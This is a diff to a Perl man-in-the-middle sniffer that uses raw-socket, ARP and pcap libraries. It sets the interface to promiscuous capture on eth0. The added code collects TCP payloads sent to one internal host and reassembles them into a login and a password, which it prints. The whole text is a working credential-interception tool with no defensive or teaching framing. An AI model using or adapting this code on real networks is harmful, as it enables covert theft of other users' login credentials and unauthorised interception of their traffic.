@@ -1,6 +1,6 @@
 #!/usr/bin/perl -w
-use strict;
-use warnings;
+#use strict;
+#use warnings;
 use Net::RawIP;
 use Net::ARP;
 use Net::Pcap::Easy;
@@ -12,37 +12,54 @@ use Socket;
 
 my $SHOW_MAC = 0;
 my $listen_mode;
+my $l;
+my %hash = (
+Login=>'',
+Password=>'');
+my $tmp=0;
+	
 GetOptions ("listen" => \$listen_mode);
 
 sub StartCap()
 {
     my $npe = Net::Pcap::Easy->new(
-        dev              => "wlan0",
+        dev              => "eth0",
         timeout_in_ms    => 0, # 0ms means forever
         promiscuous      => 1, # true or false
 
         tcp_callback => sub {
             my ($npe, $ether, $ip, $tcp, $header ) = @_;
-            if ($ip->{src_ip} ne "10.8.99.230" and $ip->{dest_ip} ne "10.8.99.230")
-            {
+            if ($ip->{src_ip} ne "10.8.99.230" and $ip->{dest_ip} ne "10.8.99.230"){
                 print "[SITM] TCP : $ip->{src_ip}:$tcp->{src_port}"
                  . " -> $ip->{dest_ip}:$tcp->{dest_port}\n";
                 print "[TCP INFO] : $ether->{src_mac} -> $ether->{dest_mac}\n" if $SHOW_MAC;
-
-    	
             }
-            if ($ip->{dest_ip} eq "10.8.99.230x" )
-            {
-                print "[SITM] TCP : $ip->{src_ip}:$tcp->{src_port}"
-                 . " -> $ip->{dest_ip}:$tcp->{dest_port}\n";
-                print("[FLAG] : $tcp->{flags}\n");
-            }
-            #if ($tcp->{dest_port} == 80 || $tcp->{src_port} == 80){
-            #    print "[SITM] Got HTTP Request !\n";
-            #        print $tcp->{data};
-            #}
 
-        },
+            if ($ip->{dest_ip} eq "10.8.111.245" ){
+				if ($tcp->{data} =~ /[A-Za-z0-9]/){            					  
+					$l.=$tcp->{data};
+					}
+							
+					
+						
+				if ($tcp->{data} =~ /\r/)
+				{					
+					if ($tmp == 0){
+						$hash{'Login'} = $l;						
+						$l = "";
+						$tmp=1;
+					}
+					elsif($tmp == 1){
+						$hash{'Password'} = $l;
+						$tmp=2;
+						foreach my $i (keys (%hash)){
+							print "$i => $hash{$i}\n";
+							}
+						}								
+					}			
+				}
+    	   	 },
+
 
         icmp_callback => sub {
             my ($npe, $ether, $ip, $icmp, $header ) = @_;
